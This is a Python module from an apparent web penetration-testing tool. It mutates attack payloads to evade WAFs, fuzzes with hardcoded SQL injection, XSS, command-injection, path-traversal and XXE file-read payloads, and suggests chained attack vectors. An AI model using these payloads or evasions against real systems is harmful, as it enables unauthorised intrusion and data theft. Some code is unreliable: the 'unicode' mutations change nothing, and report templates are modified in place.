"""
AI Enhancement Module.

Provides AI-powered features:
- LLM-powered payload mutation
- Intelligent fuzzing
- Pattern learning from successful exploits
- Natural language vulnerability descriptions
- Auto-suggest next attack vectors

For security research only - requires proper authorization.
"""
from __future__ import annotations

import hashlib
import json
import logging
import random
import re
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Optional

logger = logging.getLogger(__name__)


@dataclass
class PayloadMutation:
    """Represents a payload mutation."""
    original: str
    mutated: str
    mutation_type: str
    confidence: float
    reasoning: str = ""


@dataclass
class AttackSuggestion:
    """Suggested next attack vector."""
    attack_type: str
    target: str
    payload: str
    reasoning: str
    priority: float  # 0-1
    prerequisites: list[str] = field(default_factory=list)


@dataclass
class VulnDescription:
    """Natural language vulnerability description."""
    title: str
    summary: str
    technical_detail: str
    impact_statement: str
    exploitation_scenario: str
    remediation: str


class PayloadMutator:
    """
    AI-inspired payload mutation engine.
    
    Uses pattern-based mutations to generate new payloads
    from successful ones.
    """
    
    # Mutation strategies
    MUTATIONS = {
        "case_variation": lambda p: [
            p.upper(),
            p.lower(),
            p.capitalize(),
            ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
            ''.join(c.lower() if i % 2 else c.upper() for i, c in enumerate(p)),
        ],
        
        "encoding": lambda p: [
            p.replace("'", "%27").replace('"', "%22"),
            p.replace("'", "&#39;").replace('"', "&#34;"),
            p.replace("'", "\\'").replace('"', '\\"'),
            p.replace("<", "&lt;").replace(">", "&gt;"),
            p.replace(" ", "+"),
            p.replace(" ", "%20"),
            p.replace(" ", "/**/"),
        ],
        
        "obfuscation": lambda p: [
            p.replace(" ", "/**/"),
            p.replace("=", " LIKE "),
            re.sub(r'(\w)', r'\1/**/', p),
            p.replace("OR", "||").replace("AND", "&&"),
            p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"),
        ],
        
        "padding": lambda p: [
            f"  {p}  ",
            f"\t{p}\t",
            f"\n{p}\n",
            f"/*{p}*/",
            f"[{p}]",
            f"({p})",
        ],
        
        "concatenation": lambda p: [
            p.replace("'", "'+'" if "'" in p else p),
            p.replace("'", "''"),
            p + "-- -",
            p + "-- ",
            p + "#",
            p + ";",
        ],
        
        "null_byte": lambda p: [
            f"{p}%00",
            f"{p}\x00",
            f"%00{p}",
        ],
        
        "unicode": lambda p: [
            p.replace("'", "\u0027"),
            p.replace("<", "\u003c").replace(">", "\u003e"),
            p.replace("/", "\u002f"),
        ],
    }
    
    def __init__(self):
        self.successful_mutations: list[PayloadMutation] = []
        self.mutation_stats: Counter = Counter()
    
    def mutate(
        self,
        payload: str,
        mutation_types: list[str] = None,
        max_mutations: int = 20
    ) -> list[PayloadMutation]:
        """
        Generate mutations of a payload.
        
        Args:
            payload: Original payload
            mutation_types: Specific mutations to apply (None = all)
            max_mutations: Maximum number of mutations to generate
        
        Returns:
            List of PayloadMutation objects
        """
        mutations = []
        types_to_use = mutation_types or list(self.MUTATIONS.keys())
        
        for mut_type in types_to_use:
            if mut_type not in self.MUTATIONS:
                continue
            
            try:
                mutated_list = self.MUTATIONS[mut_type](payload)
                for mutated in mutated_list:
                    if mutated != payload and mutated not in [m.mutated for m in mutations]:
                        mutations.append(PayloadMutation(
                            original=payload,
                            mutated=mutated,
                            mutation_type=mut_type,
                            confidence=0.5,  # Default confidence
                            reasoning=f"Applied {mut_type} mutation"
                        ))
            except Exception as e:
                logger.debug(f"Mutation {mut_type} failed: {e}")
        
        # Sort by confidence and limit
        mutations.sort(key=lambda m: m.confidence, reverse=True)
        return mutations[:max_mutations]
    
    def record_success(self, mutation: PayloadMutation):
        """Record a successful mutation for learning."""
        self.successful_mutations.append(mutation)
        self.mutation_stats[mutation.mutation_type] += 1
    
    def get_recommended_mutations(self) -> list[str]:
        """Get recommended mutation types based on success history."""
        if not self.mutation_stats:
            return list(self.MUTATIONS.keys())
        
        # Return most successful mutation types
        return [m[0] for m in self.mutation_stats.most_common(5)]
    
    def smart_mutate(
        self,
        payload: str,
        context: dict = None
    ) -> list[PayloadMutation]:
        """
        Generate context-aware mutations.
        
        Uses context (WAF type, target tech, etc.) to prioritize mutations.
        """
        context = context or {}
        mutations = []
        
        # Determine best mutations based on context
        waf_type = context.get("waf_type", "").lower()
        tech_stack = context.get("tech_stack", "").lower()
        
        # WAF-specific mutations
        if "cloudflare" in waf_type:
            mutations.extend(self.mutate(payload, ["unicode", "encoding", "obfuscation"]))
        elif "aws" in waf_type:
            mutations.extend(self.mutate(payload, ["case_variation", "unicode"]))
        elif "modsecurity" in waf_type:
            mutations.extend(self.mutate(payload, ["obfuscation", "padding", "concatenation"]))
        
        # Tech-specific mutations
        if "php" in tech_stack:
            mutations.extend(self.mutate(payload, ["null_byte", "encoding"]))
        elif "asp" in tech_stack or ".net" in tech_stack:
            mutations.extend(self.mutate(payload, ["unicode", "encoding"]))
        elif "java" in tech_stack:
            mutations.extend(self.mutate(payload, ["unicode", "encoding"]))
        
        # Add recommended mutations from learning
        for mut_type in self.get_recommended_mutations():
            mutations.extend(self.mutate(payload, [mut_type], max_mutations=5))
        
        # Deduplicate
        seen = set()
        unique_mutations = []
        for m in mutations:
            if m.mutated not in seen:
                seen.add(m.mutated)
                unique_mutations.append(m)
        
        return unique_mutations[:30]


class IntelligentFuzzer:
    """
    Intelligent fuzzing engine with pattern recognition.
    
    Learns from responses to improve fuzzing effectiveness.
    """
    
    def __init__(self):
        self.response_patterns: dict[str, list[dict]] = defaultdict(list)
        self.interesting_patterns: list[str] = []
        self.payload_effectiveness: dict[str, float] = {}
    
    def analyze_response(
        self,
        payload: str,
        response: dict
    ) -> dict:
        """
        Analyze response to learn patterns.
        
        Returns analysis result with interesting indicators.
        """
        body = response.get("body", "")
        status = response.get("status_code", 0)
        headers = response.get("headers", {})
        
        analysis = {
            "payload": payload,
            "status_code": status,
            "body_length": len(body),
            "interesting": False,
            "indicators": [],
            "error_type": None,
            "reflection": False,
            "timing_anomaly": False
        }
        
        # Check for error messages
        error_patterns = {
            "sql_error": [
                r"sql syntax", r"mysql", r"sqlite", r"postgresql",
                r"ora-\d+", r"microsoft sql", r"jdbc"
            ],
            "template_error": [
                r"jinja2", r"twig", r"smarty", r"freemarker",
                r"template.*error", r"undefined variable"
            ],
            "path_error": [
                r"no such file", r"file not found", r"include.*failed",
                r"open_basedir", r"safe_mode"
            ],
            "command_error": [
                r"sh:", r"bash:", r"command not found",
                r"permission denied", r"not recognized"
            ],
            "stack_trace": [
                r"traceback", r"exception", r"stack trace",
                r"at \w+\.\w+\(", r"caused by:"
            ]
        }
        
        for error_type, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, body, re.I):
                    analysis["interesting"] = True
                    analysis["error_type"] = error_type
                    analysis["indicators"].append(f"Matched {error_type} pattern: {pattern}")
                    break
        
        # Check for reflection
        payload_parts = [
            payload,
            payload[:20],
            payload.replace("'", "").replace('"', "")[:30]
        ]
        for part in payload_parts:
            if len(part) > 5 and part in body:
                analysis["reflection"] = True
                analysis["interesting"] = True
                analysis["indicators"].append(f"Payload reflected in response")
                break
        
        # Check status code anomalies
        if status in [500, 502, 503]:
            analysis["interesting"] = True
            analysis["indicators"].append(f"Server error status: {status}")
        elif status == 200 and "error" in body.lower():
            analysis["interesting"] = True
            analysis["indicators"].append("Error in 200 response")
        
        # Check response time anomaly
        response_time = response.get("elapsed_ms", 0)
        if response_time > 5000:  # 5 seconds
            analysis["timing_anomaly"] = True
            analysis["interesting"] = True
            analysis["indicators"].append(f"Slow response: {response_time}ms")
        
        # Record pattern
        pattern_key = f"{status}_{len(body) // 100}"  # Bucket by status and body length
        self.response_patterns[pattern_key].append(analysis)
        
        # Update payload effectiveness
        if analysis["interesting"]:
            self.payload_effectiveness[payload] = self.payload_effectiveness.get(payload, 0) + 1
            self.interesting_patterns.append(payload)
        
        return analysis
    
    def generate_fuzz_payloads(
        self,
        base_input: str,
        count: int = 50
    ) -> list[str]:
        """
        Generate intelligent fuzz payloads.
        
        Uses learned patterns to generate effective payloads.
        """
        payloads = []
        
        # Basic fuzzing payloads
        basic_payloads = [
            # SQL
            "'", "''", '"', '""', "';", '";', "' OR '1'='1",
            "1 OR 1=1", "' OR ''='", "'; DROP TABLE--",
            
            # XSS
            "<script>", "</script>", "<img src=x>", "javascript:",
            "<svg/onload=alert(1)>", "'\"><img src=x>",
            
            # Command injection
            ";id", "|id", "`id`", "$(id)", "&& id", "|| id",
            ";ls", "|ls", "&& ls", "|| ls",
            
            # Path traversal
            "../", "..\\", "....//", "..%2f", "..%5c",
            "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
            
            # Template injection
            "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
            "{{config}}", "{{self}}", "${T(java.lang.Runtime)}",
            
            # Format string
            "%s%s%s%s%s", "%x%x%x%x", "%n%n%n%n", "%p%p%p%p",
            
            # Integer overflow
            "-1", "0", "999999999", "2147483647", "-2147483648",
            
            # Special characters
            "\x00", "\r\n", "\n", "\t", " " * 1000,
        ]
        
        # Add base payloads
        payloads.extend(basic_payloads)
        
        # Add variations with base input
        for p in basic_payloads[:20]:
            payloads.append(f"{base_input}{p}")
            payloads.append(f"{p}{base_input}")
        
        # Add learned effective payloads
        for effective in sorted(
            self.payload_effectiveness.items(),
            key=lambda x: x[1],
            reverse=True
        )[:10]:
            payloads.append(effective[0])
        
        # Deduplicate and limit
        unique_payloads = list(dict.fromkeys(payloads))
        return unique_payloads[:count]
    
    def get_interesting_responses(self) -> list[dict]:
        """Get all interesting responses found."""
        interesting = []
        for responses in self.response_patterns.values():
            for r in responses:
                if r.get("interesting"):
                    interesting.append(r)
        return interesting


class PatternLearner:
    """
    Learns patterns from successful exploits.
    
    Uses historical data to improve future testing.
    """
    
    def __init__(self):
        self.exploit_patterns: dict[str, list[dict]] = defaultdict(list)
        self.success_factors: dict[str, Counter] = defaultdict(Counter)
        self.vuln_correlations: dict[str, set[str]] = defaultdict(set)
    
    def record_exploit(
        self,
        vuln_type: str,
        payload: str,
        target_info: dict,
        success: bool
    ):
        """Record an exploit attempt for learning."""
        record = {
            "vuln_type": vuln_type,
            "payload": payload,
            "target_info": target_info,
            "success": success,
            "timestamp": datetime.now().isoformat()
        }
        
        self.exploit_patterns[vuln_type].append(record)
        
        if success:
            # Record success factors
            tech = target_info.get("tech_stack", "unknown")
            waf = target_info.get("waf_type", "none")
            
            self.success_factors[vuln_type]["tech_" + tech] += 1
            self.success_factors[vuln_type]["waf_" + waf] += 1
            self.success_factors[vuln_type]["payload_len_" + str(len(payload) // 10)] += 1
            
            # Record correlations
            for other_vuln in target_info.get("other_vulns", []):
                self.vuln_correlations[vuln_type].add(other_vuln)
    
    def get_success_probability(
        self,
        vuln_type: str,
        target_info: dict
    ) -> float:
        """Estimate success probability based on patterns."""
        if vuln_type not in self.exploit_patterns:
            return 0.5  # Unknown - 50/50
        
        patterns = self.exploit_patterns[vuln_type]
        if not patterns:
            return 0.5
        
        # Calculate base success rate
        successes = sum(1 for p in patterns if p["success"])
        base_rate = successes / len(patterns)
        
        # Adjust based on target similarity
        tech = target_info.get("tech_stack", "unknown")
        waf = target_info.get("waf_type", "none")
        
        factors = self.success_factors[vuln_type]
        
        # Boost if similar targets were successful
        tech_factor = factors.get("tech_" + tech, 0)
        waf_factor = factors.get("waf_" + waf, 0)
        
        # Simple weighted adjustment
        adjustment = (tech_factor + waf_factor) / (len(patterns) + 1)
        
        return min(1.0, base_rate + adjustment * 0.2)
    
    def get_recommended_vulns(self, found_vulns: list[str]) -> list[str]:
        """Get recommended vulnerabilities to test based on correlations."""
        recommendations = set()
        
        for vuln in found_vulns:
            if vuln in self.vuln_correlations:
                recommendations.update(self.vuln_correlations[vuln])
        
        # Remove already found
        recommendations -= set(found_vulns)
        
        return list(recommendations)


class AttackVectorSuggester:
    """
    Suggests next attack vectors based on context.
    
    Uses vulnerability correlations and target analysis
    to suggest effective next steps.
    """
    
    # Attack vector knowledge base
    ATTACK_VECTORS = {
        "auth_bypass": {
            "prereqs": [],
            "leads_to": ["privilege_escalation", "data_access", "rce"],
            "indicators": ["login form", "authentication", "session"],
            "priority_if": ["admin panel", "api", "dashboard"]
        },
        "sqli": {
            "prereqs": [],
            "leads_to": ["data_exfil", "auth_bypass", "file_read"],
            "indicators": ["database", "query", "select", "insert"],
            "priority_if": ["search", "filter", "sort", "id="]
        },
        "xss": {
            "prereqs": [],
            "leads_to": ["session_hijack", "phishing", "csrf"],
            "indicators": ["user input", "reflection", "html"],
            "priority_if": ["comment", "message", "profile", "name"]
        },
        "ssrf": {
            "prereqs": [],
            "leads_to": ["internal_access", "cloud_metadata", "port_scan"],
            "indicators": ["url", "fetch", "proxy", "redirect"],
            "priority_if": ["webhook", "callback", "import", "export"]
        },
        "rce": {
            "prereqs": ["file_upload", "sqli", "ssti", "deserialization"],
            "leads_to": ["full_compromise", "lateral_movement", "persistence"],
            "indicators": ["exec", "system", "eval", "command"],
            "priority_if": ["admin", "system", "eval", "debug"]
        },
        "lfi": {
            "prereqs": [],
            "leads_to": ["credential_theft", "rce_via_log_poison", "source_code"],
            "indicators": ["file", "path", "include", "require"],
            "priority_if": ["page=", "file=", "template=", "lang="]
        },
        "ssti": {
            "prereqs": [],
            "leads_to": ["rce", "data_exfil", "privilege_escalation"],
            "indicators": ["template", "render", "{{", "${"],
            "priority_if": ["email", "template", "render", "preview"]
        },
        "xxe": {
            "prereqs": [],
            "leads_to": ["file_read", "ssrf", "dos"],
            "indicators": ["xml", "soap", "rss", "svg"],
            "priority_if": ["upload", "import", "parse", "feed"]
        },
    }
    
    def __init__(self, pattern_learner: PatternLearner = None):
        self.pattern_learner = pattern_learner or PatternLearner()
        self.context_history: list[dict] = []
    
    def suggest_next_attacks(
        self,
        found_vulns: list[str],
        target_info: dict,
        current_endpoints: list[dict] = None
    ) -> list[AttackSuggestion]:
        """
        Suggest next attack vectors based on context.
        
        Args:
            found_vulns: Already discovered vulnerabilities
            target_info: Target information (tech_stack, endpoints, etc.)
            current_endpoints: List of discovered endpoints
        
        Returns:
            List of AttackSuggestion sorted by priority
        """
        suggestions = []
        
        # Get endpoints to analyze
        endpoints = current_endpoints or []
        
        # 1. Suggest based on found vulnerabilities (chaining)
        for vuln in found_vulns:
            vuln_lower = vuln.lower()
            for attack, info in self.ATTACK_VECTORS.items():
                if vuln_lower in [p.lower() for p in info.get("prereqs", [])]:
                    # This attack can follow from found vuln
                    suggestions.append(AttackSuggestion(
                        attack_type=attack,
                        target="",
                        payload="",
                        reasoning=f"Can chain from {vuln} to {attack}",
                        priority=0.8,
                        prerequisites=[vuln]
                    ))
        
        # 2. Suggest based on endpoint indicators
        for endpoint in endpoints:
            url = endpoint.get("url", "")
            params = endpoint.get("parameters", [])
            
            for attack, info in self.ATTACK_VECTORS.items():
                if attack.lower() in [v.lower() for v in found_vulns]:
                    continue  # Already found
                
                # Check indicators
                indicators = info.get("indicators", [])
                priority_if = info.get("priority_if", [])
                
                score = 0
                matched = []
                
                for indicator in indicators:
                    if indicator.lower() in url.lower() or any(indicator.lower() in p.lower() for p in params):
                        score += 0.1
                        matched.append(indicator)
                
                for priority in priority_if:
                    if priority.lower() in url.lower():
                        score += 0.2
                        matched.append(f"priority: {priority}")
                
                if score > 0:
                    suggestions.append(AttackSuggestion(
                        attack_type=attack,
                        target=url,
                        payload=self._get_sample_payload(attack),
                        reasoning=f"Endpoint matches indicators: {', '.join(matched)}",
                        priority=min(1.0, score),
                        prerequisites=info.get("prereqs", [])
                    ))
        
        # 3. Add recommendations from pattern learner
        learned_recommendations = self.pattern_learner.get_recommended_vulns(found_vulns)
        for rec in learned_recommendations:
            suggestions.append(AttackSuggestion(
                attack_type=rec,
                target="",
                payload="",
                reasoning=f"Historically correlated with {', '.join(found_vulns)}",
                priority=0.6,
                prerequisites=[]
            ))
        
        # Sort by priority
        suggestions.sort(key=lambda s: s.priority, reverse=True)
        
        # Deduplicate
        seen = set()
        unique_suggestions = []
        for s in suggestions:
            if s.attack_type not in seen:
                seen.add(s.attack_type)
                unique_suggestions.append(s)
        
        return unique_suggestions[:10]
    
    def _get_sample_payload(self, attack_type: str) -> str:
        """Get sample payload for attack type."""
        sample_payloads = {
            "sqli": "' OR '1'='1",
            "xss": "<script>alert(1)</script>",
            "ssrf": "http://127.0.0.1:80",
            "lfi": "../../../etc/passwd",
            "rce": "; id",
            "ssti": "{{7*7}}",
            "xxe": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            "auth_bypass": '{"$ne": null}',
        }
        return sample_payloads.get(attack_type, "")


class VulnDescriptionGenerator:
    """
    Generates natural language vulnerability descriptions.
    
    Creates human-readable descriptions for reports.
    """
    
    # Templates for different vulnerability types
    TEMPLATES = {
        "sqli": VulnDescription(
            title="SQL Injection Vulnerability",
            summary="A SQL injection vulnerability was discovered that allows attackers to manipulate database queries.",
            technical_detail="The application fails to properly sanitize user input before including it in SQL queries. This allows an attacker to inject malicious SQL code that can read, modify, or delete data in the database.",
            impact_statement="An attacker could extract sensitive data, bypass authentication, modify or delete data, and potentially gain access to the underlying server.",
            exploitation_scenario="1. Attacker identifies input field vulnerable to SQL injection\n2. Attacker crafts malicious SQL payload\n3. Payload is executed against database\n4. Attacker extracts sensitive data or gains unauthorized access",
            remediation="Use parameterized queries or prepared statements. Implement input validation using allowlists. Apply principle of least privilege to database accounts."
        ),
        "xss": VulnDescription(
            title="Cross-Site Scripting (XSS) Vulnerability",
            summary="A cross-site scripting vulnerability allows injection of malicious scripts into web pages viewed by other users.",
            technical_detail="The application includes untrusted data in web pages without proper encoding or validation. This allows attackers to inject scripts that execute in the context of other users' browsers.",
            impact_statement="An attacker could steal session cookies, perform actions on behalf of users, deface the website, redirect users to malicious sites, or spread malware.",
            exploitation_scenario="1. Attacker identifies XSS injection point\n2. Attacker crafts payload with malicious JavaScript\n3. Victim visits page containing payload\n4. Malicious script executes in victim's browser\n5. Attacker achieves session hijacking or other malicious goals",
            remediation="Implement proper output encoding based on context. Use Content-Security-Policy headers. Validate and sanitize all user input."
        ),
        "rce": VulnDescription(
            title="Remote Code Execution Vulnerability",
            summary="A remote code execution vulnerability allows attackers to execute arbitrary commands on the server.",
            technical_detail="The application executes user-controlled input as system commands without proper sanitization. This allows attackers to run arbitrary commands with the privileges of the web application.",
            impact_statement="An attacker could gain complete control of the server, access sensitive data, install malware, use the server for further attacks, or cause denial of service.",
            exploitation_scenario="1. Attacker identifies command injection point\n2. Attacker crafts payload with system commands\n3. Server executes attacker's commands\n4. Attacker establishes persistent access\n5. Attacker exfiltrates data or pivots to other systems",
            remediation="Avoid executing system commands with user input. Use allowlists for permitted commands. Implement strict input validation. Run applications with minimal privileges."
        ),
        "ssrf": VulnDescription(
            title="Server-Side Request Forgery (SSRF) Vulnerability",
            summary="A server-side request forgery vulnerability allows attackers to make the server send requests to unintended destinations.",
            technical_detail="The application makes HTTP requests based on user-provided URLs without proper validation. This allows attackers to access internal services, cloud metadata endpoints, or perform port scanning.",
            impact_statement="An attacker could access internal services, read cloud metadata including credentials, scan internal networks, or bypass firewalls and network segmentation.",
            exploitation_scenario="1. Attacker identifies URL input processed by server\n2. Attacker provides internal URL or cloud metadata endpoint\n3. Server makes request to internal resource\n4. Attacker receives sensitive data from internal services",
            remediation="Validate and sanitize all URLs. Use allowlists for permitted domains. Block requests to internal IP ranges. Disable unnecessary URL schemes."
        ),
        "lfi": VulnDescription(
            title="Local File Inclusion Vulnerability",
            summary="A local file inclusion vulnerability allows attackers to read files from the server's filesystem.",
            technical_detail="The application includes files based on user input without proper validation. This allows attackers to read sensitive files, potentially including source code, configuration files, and credentials.",
            impact_statement="An attacker could read sensitive configuration files, source code, credentials, and system files. This could lead to further exploitation including remote code execution.",
            exploitation_scenario="1. Attacker identifies file inclusion parameter\n2. Attacker manipulates path to access sensitive files\n3. Server returns contents of sensitive files\n4. Attacker uses obtained information for further attacks",
            remediation="Use allowlists for permitted files. Avoid using user input in file paths. Implement proper input validation. Restrict file access permissions."
        ),
    }
    
    @classmethod
    def generate(cls, vuln_type: str, context: dict = None) -> VulnDescription:
        """
        Generate natural language description for vulnerability.
        
        Args:
            vuln_type: Type of vulnerability
            context: Additional context (target, payload, evidence)
        
        Returns:
            VulnDescription with all fields populated
        """
        context = context or {}
        
        # Get base template
        vuln_lower = vuln_type.lower()
        template = None
        
        for key, tmpl in cls.TEMPLATES.items():
            if key in vuln_lower:
                template = tmpl
                break
        
        if not template:
            # Generate generic description
            template = VulnDescription(
                title=f"{vuln_type} Vulnerability",
                summary=f"A {vuln_type} vulnerability was discovered in the target application.",
                technical_detail=f"The application is vulnerable to {vuln_type} attacks due to insufficient input validation or security controls.",
                impact_statement="The impact depends on the specific vulnerability and application context.",
                exploitation_scenario="Further analysis required to determine exploitation scenario.",
                remediation="Implement proper security controls and input validation."
            )
        
        # Customize with context
        if context.get("target_url"):
            template.title = f"{template.title} at {context['target_url']}"
        
        if context.get("evidence"):
            template.technical_detail += f"\n\nEvidence: {context['evidence'][:200]}"
        
        return template


# Export classes
__all__ = [
    "PayloadMutation",
    "AttackSuggestion",
    "VulnDescription",
    "PayloadMutator",
    "IntelligentFuzzer",
    "PatternLearner",
    "AttackVectorSuggester",
    "VulnDescriptionGenerator",
]
